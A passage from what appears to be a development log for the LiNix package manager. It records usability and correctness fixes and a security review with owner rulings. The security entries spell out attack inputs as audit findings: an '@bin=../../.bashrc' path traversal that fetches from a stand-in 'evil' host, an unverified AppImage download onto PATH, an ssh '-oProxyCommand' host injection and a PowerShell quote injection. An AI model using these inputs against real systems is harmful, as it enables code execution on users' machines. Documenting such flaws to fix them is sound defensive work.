  Two of those log lines also carry stale hardcoded versions ("v3.6.0" at `services.rs:98`) — delete
  the version, don't update it. The test: help and output should describe the tool plainly, the way
  `apt`/`dnf` do, with zero adjectives selling it.

  **DONE 2026-07-19.** `--help` tagline, `lib.rs` crate docs, `bin/shim.rs`, `core/state.rs`,
  `main.rs`'s shim comment and `sync`'s "(DAG-based)" help all rewritten to say what the thing does.
  The stale versions were deleted, not updated (`v3.6.0` in the services banner went with the banner
  itself in R1's demotion; `v5.0.0` in the mail footer went in R6). **Two counts also went, and the
  entry did not ask for it: "50+ backends" and "33+ backends" were stale in opposite directions and
  disagreed with each other in the same repo.** The replacement text carries no number, so there is
  nothing left to rot — which is F4's goal reached by deletion rather than by wiring `--help` to the
  registry. **F4 is therefore narrower than it was, not done: the README line it also names is
  untouched.**

- **R8 — Rename `--i-really-mean-it` to `--allow-mass-purge`.** `purge-unmanaged` guards itself with
  the jokey `--i-really-mean-it` (`cli/args.rs:141`, used at `main.rs:2809`,`:2819`), while every
  sibling destructive gate is sober and consistent: `--allow-mass-removal`, `--allow-mass-install`
  (`args.rs:36`,`:43`). Rename it into that family — `--allow-mass-purge` — and update the flag, its
  handler param, and the hint text at `main.rs:2819`. One vocabulary for the guard, no jokes.

  **DONE 2026-07-19.** Flag, the `allow_mass_purge` field, the handler parameter and the hint text.
  `grep -rn "i-really-mean-it" src/` is silent.

- **R9 — General rule: no emoji and no self-branding in user-facing output.** Output states the
  plain fact and the action to take; it does not decorate with emoji or narrate itself as "LiNix
  Insight" / "Semantic analysis". Concrete sites: the dependency hints at `diagnostics.rs:134`,`:235`
  (`💡 LiNix Insight: Semantic analysis identified a missing dependency` → `missing dependency: X —
  try: linix install X`), and the notification emoji at `notify.rs:23-26`,`:151` (covered by R6).
  A sweep confirmed those are the only two files with emoji, but this is a **standing rule** for all
  new output too: plain text, name the problem, name the fix.

  **DONE 2026-07-19.** Both `diagnostics.rs` hints are plain; the notification emoji went in R6.
  **Three non-emoji symbols were deliberately kept and are recorded here so the next sweep does not
  read them as a miss:** `✓`/`✗` in the metrics summary, `★` marking active profiles in `profile
  list` help, and a `✓` inside a snap-output test fixture. They carry information rather than
  decorating, which is the distinction the rule is drawing.

- **R10 — Standardize the dry-run label to `[DRY-RUN]`.** It is uppercase almost everywhere, but two
  spots print lowercase `[dry-run]` — `bisect.rs:84` and `go.rs:159`. Same concept, one spelling: make
  both `[DRY-RUN]`.

  **DONE 2026-07-19 — and there was a third site the entry missed**, `main.rs`'s canary dry-run line.
  All three now read `[DRY-RUN]`.

- **R11 — Collapse `watch`'s duplicated sync pipeline into one shared reconcile.** `watch_reconcile`
  (`main.rs:515+`) hand-copies `handle_sync`'s body — resolve model, `enforce_policy`,
  `apply_repositories`, `ChangePlanner`, `print_flight_plan`, `sync_engine().sync()` — and its own
  comment admits "the same three ordering phases sync does." The `watch` feature is legitimate and it
  does go through the guard (`GuardScope::Watch`), so this is not a safety hole — it is a
  two-of-everything smell: change sync's ordering and `watch` silently drifts unless someone updates
  both. Not a deletion — a consolidation: extract one shared reconcile that both `handle_sync` and
  `watch_reconcile` call, with `watch` passing an unattended/no-confirm scope. Delete the copy.

  **DONE 2026-07-19.** One `reconcile(app, Reconcile { locked, json, scope, confirm })`;
  `handle_sync` passes `confirm: true` / `GuardScope::Sync`, `watch_reconcile` passes
  `confirm: false` / `GuardScope::Watch`, and the copy is gone. **The copy had already drifted,
  which is the entry's own prediction coming true:** `watch`'s "nothing to do" test checked
  packages and dependents but not schedules, so a config whose only change was a `schedule:` line
  read as a no-op on a watch tick and as real work under `sync`. Both now use sync's three-way
  test.

- **R12 — Rename `cockpit` to a descriptive name.** The command (alias `tui`, `args.rs:360-363`)
  opens an interactive browser for generations, but is named "Time-travel cockpit" — nobody scanning
  `--help` guesses `cockpit` = "browse my generations." Rename to something plain like `browse` or
  `history`, keep `tui` as an alias, and drop the "time-travel" wording (also covered by R7). Exact
  name is the implementing agent's call.

  **DONE 2026-07-19 — the name is `history`, `tui` kept as the alias.** `browse` was the other
  candidate and lost because the thing being browsed is the manifest history specifically, and
  `history` says so without a second word. `ui/cockpit.rs` → `ui/history.rs`, `Cockpit` →
  `HistoryBrowser`, `CockpitAction` → `HistoryAction`. **The help text also stopped saying
  "generations", which no longer exist** — it browses commits (II.1: git IS the history).

- **R13 — Fix `uninstall`'s help wording.** Command help says "Imperatively uninstall one or more
  packages" and the arg help says "Names of packages to purge" (`args.rs:307-309`). "purge" collides
  with the separate `purge-unmanaged` command, and "Imperatively" is jargon that also contradicts the
  model — uninstall is undeclare + sync, i.e. declarative. Plain: "Uninstall one or more packages" /
  "Names of packages to uninstall."

  **DONE 2026-07-19.**

- **R14 — Drop the "ghost shell" metaphor; don't clobber the user's prompt.** The `shell` command
  (ephemeral shell with packages loaded) brands itself "ghost shell" (`args.rs:353`), sets
  `LINIX_GHOST=true`, and forces `PROMPT_COMMAND` to prefix `(linix-ghost)` (`shell/mod.rs:175`,`:218`),
  which can stomp a user's own prompt setup. Rename to plain "ephemeral shell", and use a
  non-intrusive session marker (an env var the user can opt into displaying) instead of overwriting
  `PROMPT_COMMAND`.

  **DONE 2026-07-19.** The `PROMPT_COMMAND` override is deleted — nothing replaces it, because the
  marker the entry asks for already existed: the session env var, renamed `LINIX_GHOST` →
  `LINIX_EPHEMERAL_SHELL`, which a user can show in their own prompt if they want it. The type
  `GhostShell` → `EphemeralShell` and the "ghost" wording is gone from help and comments.

- **R15 — "Flight plan" → plain "Planned changes".** The change preview header prints "Flight plan:"
  (`main.rs:3515`), and the aviation metaphor recurs in `--quiet` help and config comments
  (`args.rs:58`, `config.rs:208`, `main.rs:445`). Rename to something plain like "Planned changes:"
  everywhere the phrase appears.

  **DONE 2026-07-19.** The header, the `--quiet` help, the config comment and the `main.rs` comment.
  `print_flight_plan` is still the function's name — internal, not user-facing, and renaming it
  touches three call sites for no reader's benefit. **Flagged rather than silently left:** if the
  next reader disagrees, it is a one-line rename.

- **R16 — Tone down the shouty `THERE IS NO UNDO FOR THIS.`** Printed in all-caps at `main.rs:2859`
  and `:2867` — the loudest string in the tool. The warning is justified for a destructive command,
  but sentence case carries it: "This cannot be undone." Fix both spots.

  **DONE 2026-07-19.** Both spots.

- **R17 — `export` must never silently overwrite; handle the conflict.** `export()` does
  `tokio::fs::write(path, text)` with no existence check, no backup, no `--force` (`export.rs:179`);
  the default out dir is `.` and with no `--format` it writes **every** format (`export.rs:158`). So
  `linix export` in a Node project overwrites the real `package.json` with a LiNix stub — and
  `handle_export` has no dry-run branch (`main.rs:3579`), so `--dry-run` clobbers it too. Meanwhile
  `module create` / `config init` / `init` all refuse to overwrite without `--force`. Fix:
  (a) honor `--dry-run` (write nothing, report what *would* be written); (b) **never silently clobber
  an existing file** — on a name collision, write to a non-colliding name (append a suffix, e.g.
  `package.linix.json`) or merge into the existing file where the format makes merge well-defined
  (e.g. appending `Brewfile` lines), never a blind replace; (c) `--force` for a deliberate plain
  overwrite. The default must be conflict-safe, not destructive.

  **DONE 2026-07-19 - the non-colliding-name option, not merge.** `export` returns an `Outcome`
  per format (`NoPackages` / `Wrote` / `WroteBeside` / `WouldWrite`) instead of a bare `wrote?`
  flag, so the caller can say where the bytes actually went. A taken name goes to
  `package.linix.json`, and if *that* is taken too, `package.linix.json.2` - a second export must
  not clobber the first export's fallback either. `--force` overwrites deliberately; `--dry-run`
  writes nothing and names the path it would have used.

  **Merge was rejected**: it is well-defined for `Brewfile` and `requirements.txt` and not for
  `package.json`, where merging LiNix's stub into a real project's dependency tree is a
  destructive edit wearing a safe word. One rule across four formats beats two rules and a
  footnote.

  **Verified against the real binary, not only unit tests** - in a scratch directory holding a
  genuine `package.json`: dry-run wrote nothing, the plain run left the real file byte-identical
  and wrote `package.linix.json`, a second run wrote `package.linix.json.2`, and `--force`
  replaced the original. Unit tests cover `beside()` and `free_path()`.

- **R18 — `rollback` must refuse to apply unconfirmed in a non-interactive shell, like `sync` does.**
  In `rollback_to` (`main.rs:1897-1911`) the confirmation TUI runs only `if stdin().is_terminal()`, so
  a non-interactive shell (pipe/CI/cron) without `--yes` skips the check and falls through to apply.
  `handle_sync` in the same case hard-bails ("Refusing to apply changes without confirmation in a
  non-interactive shell", `main.rs:450-457`). So `echo | linix rollback <gen>` applies unprompted. It
  still routes through `GuardScope::Rollback` (protected packages safe), but the missing confirmation
  is a real sibling inconsistency. Fix: mirror `sync` — bail without `--yes` in a non-interactive shell.

  **DONE 2026-07-19, and the entry described code that no longer exists.** There is no
  `rollback_to`: Phase 4 rebuilt `rollback` on git, and it now delegates to `handle_sync`, which
  already carries the non-interactive bail. **So the reported bug was fixed - but a worse one had
  taken its place underneath it.** `handle_rollback` runs `git.checkout_files(reference)` *before*
  calling `handle_sync`, so a non-interactive `linix rollback <ref>` without `--yes` overwrote the
  manifests and only then refused to converge the machine - leaving the files rolled back and the
  system not, which is the half-applied state rollback exists to avoid. The bail now runs before
  the checkout.

- **R19 — `clean` must preview, respect the guard, and stop being blind.** Today `clean_orphans`
  (`context.rs:851-856`) loops **every** available backend and runs native orphan removal with
  auto-confirm baked in (`apt autoremove -y`, `pacman -Rs --noconfirm`, `dnf autoremove -y`, …) — no
  preview, and outside LiNix's `protected_packages`/`max_removals` guard (these are native-orphan
  removals the manager decides). Owner ruling:
  - **Orphan removal stays** (that is what it should do), but it must **show what it will remove and
    confirm** — the same flight-plan-then-confirm shape as `sync` — and **respect the protected list**,
    not run `-y`/`--noconfirm` blind.
  - The name "clean" reads as janitorial (caches). **Rename** it to say what it does (e.g.
    `remove-orphans`) if that is clearer.
  - **Cache-cleaning is a separate real need that must also exist** — either a second command
    (e.g. a cache cleaner) or one command with two modes. Both jobs (orphans, caches) must be doable.
    The exact command topology is the implementing agent's call; that both exist and that orphan
    removal previews + respects the guard is the ruling.

  **DONE 2026-07-19 - two commands: `remove-orphans` and `clean-cache`.** `clean` is deleted.
  `remove-orphans` lists every backend's orphan set, prints it under "Planned changes:", puts the
  whole set through `guard::enforce` (so the protected list and the removal ceiling judge the
  total, not one backend at a time), asks, and then removes **exactly the names it showed** via
  each backend's ordinary `remove` - not the native `autoremove`, whose set can move between the
  preview and the answer. `clean-cache` needs no preview and no guard because it removes no
  installed package.

  **The trait split is what made the preview possible.** `Upgradable::clean_orphans` did the
  listing and the removing in one call, which is why there was nothing to show: it was replaced by
  `list_orphans()` (names, no side effects) and `clean_cache()`. Twelve backends' `clean_orphans`
  stubs were deleted outright - they returned `Unsupported`, which is now the trait default.

  **Three operations were misfiled as orphan removal and are cache cleaning**: `mise prune`,
  `pnpm store prune`, and `nix-collect-garbage`. So was `xbps-remove -Oy` - `-O` cleans the cache;
  orphan *removal* on xbps is `-o`. **The old `clean` had been cleaning caches on four backends
  while reporting orphan removal, and removing real packages on the others, under one name.**

  **The judgement call, recorded because it could reasonably go the other way:** `emacs`, `flatpak`
  and generic-with-`orphan_args` (apt) remove orphans natively but cannot enumerate them. Deleting
  that capability would have been a feature removal nobody approved (rule 4); folding it into a
  list the user was shown would be a lie, since those packages are not in it. So they run *after*
  a confirmation that names them and says plainly that their removals could not be previewed or
  checked against the protected list. **If the owner would rather those backends simply lose orphan
  removal until they can list, that is a one-line change** - the predicate is
  `Upgradable::has_native_orphan_removal`.

  **RULED 2026-07-22: the owner took that change, and more of it.** The judgement call above was
  sound about the trade and wrong about the safety, because the sentence naming the unpreviewable
  backends is printed *by the confirmation*, and `--yes` skips the confirmation. See **V.56**;
  the rule is in **II.10** and **II.11c**. A backend that cannot list is now asked by dry run
  (`apt-get autoremove --dry-run`, `dnf autoremove --assumeno`) and joins the enumerated set; one
  that cannot even do that loses orphan removal and is named. The native-verb branch is deleted,
  not gated.

  **`has_native_orphan_removal` exists because of a bug in this session's own first draft:** the
  code asked whether a backend supported unlistable removal by *calling* `clean_orphans` and
  checking for `Unsupported` - which performed the removal it was seeking permission for. A
  side-effect-free predicate replaced the probe.

  **Also deleted: `src/app/clean.rs`.** A second, 60-line orphan-cleaning implementation that was
  not listed in `app/mod.rs` and therefore never compiled or ran. Two of everything, where the
  second one was already dead.

- **R20 — Auto-remediation swallows its state-save failure.** When failure diagnostics auto-installs
  a suggested package and persists the registry, `diagnostics.rs:206` writes
  `let _ = spawn_blocking(|| state_snapshot.save()).await.map_err(…)?` — the `?` catches only the task
  panic; the `let _ =` discards `save()`'s own `Result`. A disk-write failure (full/read-only/permission)
  is swallowed: the package is installed and in memory but never recorded, so the next `sync` treats it
  as unmanaged drift. The sibling save at `sync/mod.rs:136` propagates correctly with `??`. Fix: `?` → `??`.

  **DONE 2026-07-19.** Exactly as written: `let _ = ... ?` became `... ??`, so a failed state
  write now propagates instead of leaving the package installed, in memory, and unrecorded.

- **R21 — File-backed backends report removal success when the file delete failed.** `github.rs:347-359`
  (and the same shape in `web.rs:260-268`, `appimage.rs:143`,`:176-177`): `remove()` drops the package
  from LiNix state, then best-effort deletes the binary and install dir with `let _ =`, logs "Purged",
  saves state, returns `Ok`. If the delete fails — locked binary (common on Windows), permission denied
  — the package vanishes from LiNix's view but the executable stays on disk and on PATH, and since
  queries read from LiNix state it becomes invisible drift no `sync` catches. Fix across all three
  backends: surface the delete failure — warn and do not record it as a clean removal; better, return
  the error so state is not updated as if the package is gone.

  **DONE 2026-07-19.** One shared `utils::file::remove_deployed_path` rather than the same logic
  three times: it treats `NotFound` as success (the goal is "not on disk") and returns the path and
  OS error otherwise. All three `remove()` paths now collect per-package failures, **put the record
  back into state when a delete failed** - so the package stays visible to LiNix and to the next
  `sync` instead of becoming drift nothing can see - and return `Err` naming what is still
  installed. The `appimage.rs:143` site the entry also names is on the *install* path (clearing a
  stale link before making the new one); it now surfaces its failure too, since a silent failure
  there records a package whose link still points at the previous version.

- **R22 — Prune counts IDs as deleted even when the delete failed.** `snapshot.rs:506-514` logs a
  failed `p.delete(id)` at `debug!` only and returns the full `doomed` list; `app/generation.rs:387`
  does `let _ = tokio::fs::remove_file(self.path_for(id)).await` and returns the full `doomed`. The
  caller prints "pruned N", so a snapshot/generation the delete couldn't remove is still reported gone
  — a said-so, not a done. Fix: return only the IDs actually deleted, and surface the failures.

  **DONE 2026-07-19 for snapshots; the generation half no longer exists.** `prune_with_policy`
  returns only the ids whose `delete` succeeded, and `warn!`s the failures with the OS error and
  the count still on disk. `app/generation.rs` - the entry's second citation - was deleted in Phase
  4 when history moved to git, so there is nothing there to fix.

- **R23 — Rollback misses a node aborted mid-mutation, and the WAL net lapses after 4h (hardening).**
  On a node failure with auto-rollback, the transaction does `abort_all()` then `rollback()`
  (`transaction.rs:264-265`), but `rollback()` compensates only `self.history` — nodes that *completed*
  (`:241`). A sibling aborted mid-`remove` already ran the OS removal yet never entered `history`, so
  rollback won't reinstall it. The catch is the WAL: that node stays `InProgress`, so the next `sync`
  auto-heals it — **except** `journal.cleanup()` flips `InProgress` entries older than 4h to `Abandoned`
  (`journal.rs:263-271`), after which recovery no longer fires. Narrow (needs abort mid-mutation + no
  sync within 4h + cleanup), so low severity, but a real hole. Harden: either have rollback also
  compensate started-but-not-completed nodes, or make an `Abandoned` entry still trigger a heal/warn
  rather than dropping it from recovery.

  **DONE 2026-07-19 - the second option.** `get_incomplete_actions` and `needs_recovery` now
  include `Abandoned`, so a crash aged out at 4h is still healed instead of dropped. The first
  option (compensating started-but-not-completed nodes in `rollback`) was rejected because the
  transaction cannot know whether an aborted node's OS mutation ran; the WAL can, and it is
  already the authority `heal` reads. **The `ActionStatus::Abandoned` doc comment said "no longer
  healable" and the `get_incomplete_actions` comment spelled the hole out in full** - the bug was
  documented in the code before it was found in review. Both comments now state the rule that
  holds. Covered by `an_aged_out_crash_is_still_healable`.

### Security — the 2026-07-17 review pass (PROBLEMS RECORDED, approaches DECIDED, most unimplemented)

> **DEFERRED BY THE OWNER (2026-07-17): SEC1–SEC6 are consciously parked, to be decided and
> fixed in a later dedicated pass — not forgotten.** The owner reviewed a proposed decision batch
> (SEC1 traversal confinement, SEC2 download strictness, SEC3/SEC6 path confinement, SEC4/SEC5
> injection hardening) and chose to handle them later. **Do not implement SEC1–SEC6 until that
> pass.** Already resolved and out of this set: **SEC7** (dead Lua code-exec path — deleted) and
> the **SEC3 panic** (bare `~` out-of-bounds slice — fixed). **Every approach SEC1–SEC6 is now
> decided** (see their entries) — implementation still waits for the pass, except for the
> **no-escape-hatch batch (SEC4, SEC5, SEC6)**, which trades nothing away and is cleared to land
> early, together. SEC3 is decided as **won't-fix**: `@target` stays unconfined, and only its
> outside-home confirmation is to be built.
>
> **The early batch LANDED 2026-07-19: SEC4, SEC5 and SEC6 are built, each with tests, suite
> green and clippy silent.** Read each entry for what was built — **SEC5's `id` half deviates
> from the ruling's letter and its entry says how and why.**
>
> **The deferred pass then LANDED too, and this paragraph said otherwise until 2026-07-22.**
> **SEC1** (`@bin` confinement, `[guard] confine_bin`, default on) and **SEC2** (HTTPS +
> checksum by default) landed 2026-07-19; **SEC3's** outside-home confirmation landed in the
> eighth session, asked in `reconcile` before the repo phase. **Nothing in SEC1–SEC6 is now
> unimplemented** — which is what the head of this document has said since, while these three
> lines still read "nothing in the deferred set was touched." A status line that outlives its
> status is the same failure as a check that cannot fail: it reports safely and is not read
> again.

Unlike R1–R23 above (owner-approved fixes), these were recorded vulnerabilities held back from
implementation until the owner ruled on the approach. **All six approaches are now ruled on;**
what remains is the deferred pass for SEC1–SEC3, and the early batch for SEC4–SEC6. A pass 5
security review confirmed the core is sound — every package-manager command is built as argv
(no `sh -c`, no `format!`-into-shell), the II.12 hook-approval ledger is enforced on every
hook-exec path, sudo is argv not a string, and archive extraction rejects `..`/absolute members.
The problems are in the download/link backends, where a pasted `web:`/`appimage:`/`github:`/`link:`
spec carries untrusted URLs and `@`-options to the filesystem with no validation.

- **SEC1 — VERY SERIOUS. `@bin` path traversal → code execution on next login (web backend).**
  `bin_name` comes straight from the `@bin=` option, unsanitized, and is joined into
  `~/.local/bin/<bin_name>` (`web.rs:168-178`); LiNix then removes whatever sits at that path and
  symlinks it to the downloaded, attacker-controlled file (`web.rs:209-226`). The value is never
  validated — the grammar checks only the option *key* (`config/grammar/options.rs`), not the value.
  **Exploit, one pasted line:** `web:http://evil/payload @bin=../../.bashrc` resolves the destination
  to `~/.bashrc` and drops a symlink there pointing at the attacker's file; the next shell start
  sources it and runs code. `@bin=../../.ssh/authorized_keys`, `../../.config/autostart/x.desktop`,
  `../../.config/systemd/user/…` all work identically. It is user-level (not root), but it is a clean
  single-line RCE from a copied install spec, and it fires **even when the download is HTTPS and
  checksummed** — the traversal is in the destination, not the source. Reachable, high confidence.
  ~~**Solution TBD.**~~ **DECIDED 2026-07-17 (owner): resolve the final destination and refuse it if
  it escapes `~/.local/bin`.** Gated by a config key that turns the protection on and off; on by
  default. Off restores today's unchecked behaviour — the escape hatch is the user's to open.
  **BUILT 2026-07-21** (the owner opened the pass). `utils::bin_destination` is the one place a
  PATH destination is built from a name, and it refuses any name carrying a path separator, `..`,
  an absolute path or nothing at all — refuses rather than normalises, because "what does
  `a/../b` mean" has a different answer on every filesystem and none is worth being wrong about.
  `[guard] confine_bin` (default true) is the key. All three download backends call it, and it
  also absorbed the three copies of the Windows `.exe` suffixing they each carried.

  **Honest correction, found while building it: the exploit as written was already dead.**
  `@bin` is refused on `web` — not by anything security-motivated, but by VIII.2's artifact-option
  validation (2026-07-20), which allows `@bin` only on a backend that resolves one name to several
  files, and `web:URL` names exactly one. So `web:…@bin=../../.bashrc` has been a parse error since
  that landed, and web.rs's `options.get("bin")` was a dead branch (now deleted). What this item
  actually closes is the *residual* traversal — the name derived from the URL's last path segment,
  and github's repo name — and, more to the point, it makes the confinement structural, so the next
  backend that deploys to PATH cannot reintroduce it. **A vulnerability closed by accident is
  closed until somebody accidentally reopens it.**

- **SEC2 — SERIOUS. Download-and-execute with no integrity check; plaintext HTTP allowed
  (appimage/web).** `appimage.rs:108-148`: `url = spec.name`, `client.get(url)` accepts any `http://`
  URL, writes the response, `chmod 0o755`, and symlinks it into `~/.local/bin` — with **no checksum
  option at all** for appimage. `appimage:http://evil/foo.AppImage` places an attacker-controlled,
  network-fetched executable on PATH with zero verification; running `foo` later is RCE. `web.rs`
  has the same download→`0o755`→PATH flow, but `@sha256` is *optional* and `http://` is accepted, so
  a bare `web:` spec is download-and-run-unverified. `github.rs` is the same optional-checksum pattern
  but over HTTPS to api.github.com (lower risk). `core/security.rs::verify_checksum` is correct — the
  gap is that nothing forces it to run and nothing forbids `http://`; reqwest also follows up to 10
  redirects, so an `https://` seed can be bounced to `http://`. Reachable, high confidence.
  ~~**Solution TBD.**~~ **DECIDED 2026-07-19 (owner): a remote download is HTTPS and checksummed by
  default; each relaxation is a separate opt-out, and the opt-out lives on the individual spec line —
  there is no config key that disarms the class.** Three rules, for `web:`/`appimage:`/`github:`:

  1. **The URL must be `https://`.** Opt out per spec with the bare flag `@allow_http`.
  2. **No downgrade across redirects.** The scheme check applies to the URL actually fetched, not
     just the one that was typed — an `https://` seed that lands on `http://` is refused. Cheapest
     correct form is to check every hop, which also covers the middle of a redirect chain; the
     binding requirement is that the *final* download is what gets verified. Same `@allow_http` opt-out.
  3. **A checksum is required.** Opt out per spec with the bare flag `@unverified`.

  `@allow_http` and `@unverified` are **separate flags and never imply each other** — allowing plain
  HTTP for a host that only serves HTTP must not silently also drop the checksum, and that combination
  is exactly the one where the checksum is doing the most work.

  Consequences to implement in the pass:
  - `appimage` has **no `@sha256` option at all** today. The option must be added, not merely enforced.
  - `appimage` must be wired into `core/security.rs::verify_checksum`; `web`/`github` already call it,
    and only the "required" half changes for them.
  - An install that used `@unverified` is **recorded as unverified in the registry** and shown as such
    by `status`. Once the install finishes, a checksummed and an unchecksummed binary are otherwise
    indistinguishable, and the flag is only a real decision if it stays visible after the fact.
  - The bare-flag form already parses (`config/grammar/options.rs`, `@hold` → `"true"`); no grammar
    change is needed, only the II.2 option table.

  *Why per-spec and not a config key:* a global "require checksums" switch with an off position gets
  turned off once, by the first person who hits a publisher that doesn't publish hashes, and never
  gets turned back on — leaving a system that looks protected and isn't. A per-line flag has to be
  written for each spec that needs it, and it stays in the config file where the next reader sees it.
  This is the same shape as SEC1's decided escape hatch: refuse by default, and the opening is the
  user's to make explicitly. **BUILT 2026-07-21** (the owner opened the pass), in `core/download.rs`
  — one module, so the three backends cannot drift on what "verified" means. `@allow_http` and
  `@unverified` are in II.2's option table and refused by name on any backend that does not
  download (`capability::downloads`), because an option nobody reads is a line that does nothing.
  appimage gained checksum verification, run **before** the `chmod 0755`, so an unverified file
  never exists as an executable even briefly; on a mismatch the download is deleted rather than
  left on disk. `status` lists every package installed with `@unverified`, for as long as it is
  installed — after the fact a checksummed binary and an unchecksummed one are indistinguishable,
  so the flag is only a real decision if it stays visible.

  **`github:` is exempt from the checksum half — RULED 2026-07-21 (owner), and it is a collision
  between two decisions, not an omission.** This entry (2026-07-19) says all three backends require
  a checksum. VIII.2 (2026-07-20, one day later) makes a hand-written `@sha256` on `github:` legal
  *only* when the line pins exactly one format, because one release ships a `.deb`, an `.rpm` and a
  tarball and one hash cannot verify all of them — and puts github's integrity in
  `locks/github.toml` instead. Requiring a checksum there would therefore force `@formats=` onto
  every github line or push everyone to write `@unverified`, which turns the flag into noise rather
  than a decision. *(Options offered: the lock is github's checksum; require it and live with
  VIII.2's limits; or a first-run confirmation prompt.)* The owner chose the lock. **The HTTPS half
  still applies to github**, on every redirect hop — its asset URLs redirect to a CDN, and the hop
  is exactly where a promised HTTPS download stops being one.

  Not covered by this decision: HTTPS and checksums do **not** address SEC1 — that traversal is in the
  `@bin` destination, not the source, and a fully verified HTTPS download still lands wherever `@bin`
  points. The two fixes are independent; landing this one does not close that one.

- **SEC3 — `@target` (link backend) has no path confinement, and a bare `~` panics.** `link.rs:225-231`
  uses `@target` raw: `~`-prefixed → `home_dir().join(&target_str[2..])`, otherwise
  `PathBuf::from(target_str)` (any absolute path). `link:/src @target=/etc/cron.d/x` places/symlinks a
  file wherever the value points (whatever the user can write). This is closer to the link backend's
  stated purpose (placing dotfiles/managed files) than SEC1's traversal, so the question is whether to
  confine it at all — an explicit decision, not a clear exploit. Separately a robustness bug:
  `&target_str[2..]` on a bare `"~"` (len 1) is an out-of-bounds slice → **panic** on a malformed spec,
  and `"~x"` silently drops the `x` (use `strip_prefix("~/")`, guard the length). ~~**Solution TBD.**~~
  **Panic half FIXED 2026-07-17** (`strip_prefix("~/")`; bare `~` → home dir).

  **Confinement half DECIDED 2026-07-19 (owner): do not confine `@target`. SEC3 is closed —
  no path allowlist, now or in the security pass.** An arbitrary destination *is* the link
  backend's purpose: `~/.gitconfig`, `~/.config/nvim/`, `/etc/…` are the intended uses, so an
  allowlist would be removing the feature, and the escape hatch added to compensate would make
  the list decoration. This is the line between SEC3 and SEC1: `@bin` names a file *inside*
  `~/.local/bin` and traversal makes it mean something else — a gap between what the user typed
  and where the file lands. `@target=/etc/cron.d/x` has no such gap; it says exactly what it does.

  One addition, and it is the whole of the fix: **a `@target` that resolves outside the home
  directory prompts for confirmation on first install** — a confirmation, not a refusal, and not
  gated by a config key. Free for the dotfiles case (all under `~`), and it puts a beat between a
  pasted spec line and a system path. This is the only part of SEC3 the security pass implements.
  **BUILT 2026-07-21.** Asked in `reconcile`, before the repo phase and before any package is
  touched, because that is the one function that applies extras at all — a `link:` line never
  enters the package graph, so a check placed beside the guard would have been in a code path
  `link:` does not travel. `--dry-run` prints the destinations and says a real run would ask;
  `--yes` proceeds (this is a confirmation, not the guard); a non-interactive shell without
  `--yes` is an error naming the count, not a hang. Install and confirmation resolve `@target`
  through one function (`backends::link::resolve_target`) — two resolutions is a run that
  confirms one destination and writes another.

  **"First install" is asked of the destination, not of the ledger.** `locks/extras.toml` keys a
  link by its *source*, so a line whose `@target` was edited from `~/.gitconfig` to a system path
  is the same ledger entry it always was — the first version of this asked the ledger and was
  silent on exactly the edit worth asking about. A destination that is not there yet is the run
  that creates it.

- **SEC4 — SSH host argument injection (fleet), semi-trusted input.** `fleet.rs:24-28` passes `host`
  to `ssh` with no `--` separator: `.arg("-o").arg("BatchMode=yes").arg(host).arg(remote_cmd)`. A host
  like `-oProxyCommand=<cmd>` or `-oPermitLocalCommand=…` is parsed by ssh as an option and runs a
  command on the **local** machine. The `remote_cmd` side is a LiNix constant (`linix status --json` /
  `linix sync -y`), so only `host` is the vector. Hosts come from the user's own `fleet_hosts` config
  or CLI (semi-trusted), so lower severity — but a fleet list from a shared/generated source makes it
  reachable. ~~**Solution TBD.**~~ **DECIDED 2026-07-19 (owner): do both halves — reject the input
  *and* terminate the option list.** **BUILT 2026-07-19 — both halves.** `check_host` refuses any
  host beginning with `-` and is called from `ssh_capture` (so no call site can skip it) *and* over
  the whole resolved host list in `fleet()` before the first connection, which is what turns a
  silent local command into one error naming the host. `--` sits after the `-o BatchMode=yes` pair.
  Test: `a_host_that_looks_like_an_ssh_option_is_refused`. They are not alternatives:

  1. **Refuse a host beginning with `-`**, where the host list is read (both the CLI argument and
     `fleet_hosts`). This is the half that produces a comprehensible error instead of a silent
     local command.
  2. **Pass `--` before `host`** in `ssh_capture`. Defence in depth against a future second call
     site that skips the validation. It must sit *after* the `-o BatchMode=yes` pair:
     `.arg("-o").arg("BatchMode=yes").arg("--").arg(host).arg(remote_cmd)`.

  `ssh_capture` (`fleet.rs:22`) is currently the only spawn of `ssh` in the tree and both `fleet`
  call sites (`:88`, `:159`) go through it, so rule 2 is a one-line change today. Rule 1 is what
  keeps that true: a guard on one call site is a guard on nothing.

  **No config key, no per-spec opt-out, no escape hatch.** This is the one item in SEC1–SEC6 with
  nothing to trade away — there is no legitimate host named `-oProxyCommand=…`, so refusing it costs
  no real usage. It therefore needs none of the machinery SEC1 and SEC2 do, and may land ahead of
  the dedicated security pass rather than inside it.

- **SEC5 — Latent PowerShell injection in snapshot ops (Windows, elevated).** `snapshot.rs` builds
  PowerShell by interpolation and runs it via `-Command` with elevation: `Checkpoint-Computer
  -Description 'LiNix: {label}'` (`:344` — a `'` in label escapes the quote), and `DeleteStatus({id})`
  / `Restore-Computer -RestorePoint {id}` with `id` interpolated **unquoted** (`:384`,`:392`). Traced:
  `label` is always a compile-time constant (`pre_sync`, `pre_upgrade`, `purge-unmanaged`, `pre_canary`)
  and `id` comes from the system's own `SequenceNumber` via list/bisect/canary/undo — **not currently
  attacker-reachable**, so this is latent, not live. But the day any command lets a user pass a
  snapshot label or id straight through, it becomes an elevated-PowerShell injection.
  **Approach decided (2026-07-19); BUILT 2026-07-19 — make both values untypeable as injection
  rather than validating them:**
  1. **`id` becomes `u32`, not a string.** Parse the `SequenceNumber` at the boundary where Windows
     returns it and keep it typed through list/bisect/canary/undo. That closes `:384`/`:392` with no
     validation logic to forget at a future call site — the type is the guard.
  2. **`label` becomes an enum**, not a `&str`. There are exactly four values (`pre_sync`,
     `pre_upgrade`, `purge-unmanaged`, `pre_canary`); an enum with `as_str()` means no caller — a
     future `--label` flag included — can reach `:344`'s interpolation with a quote in hand.

  Both are pure hardening: no behaviour change, no config key, no escape hatch. By the SEC4 argument
  (nothing to trade away) **the owner cleared this to land ahead of the pass (2026-07-19)**, in one
  batch with SEC4 and SEC6.

  **What was built, and the one place it departs from the ruling above.** `SnapshotLabel` is an enum
  with the four values and an `as_str()`; `SnapshotProvider::create` takes it, so no caller can reach
  `:344` with a quote (rule 2, as written). **Rule 1 was implemented as a parse at the Windows
  boundary rather than a `u32` threaded through `Snapshot`, and that is a deviation worth reading.**
  `Snapshot.id` is one field shared by four providers, and the other three have genuinely
  non-numeric ids — btrfs `linix_pre_…`, zfs `dataset@linix_…`, timeshift a comment string. Typing
  the field `u32` would have made the id meaningless for three of the four, so the number is parsed
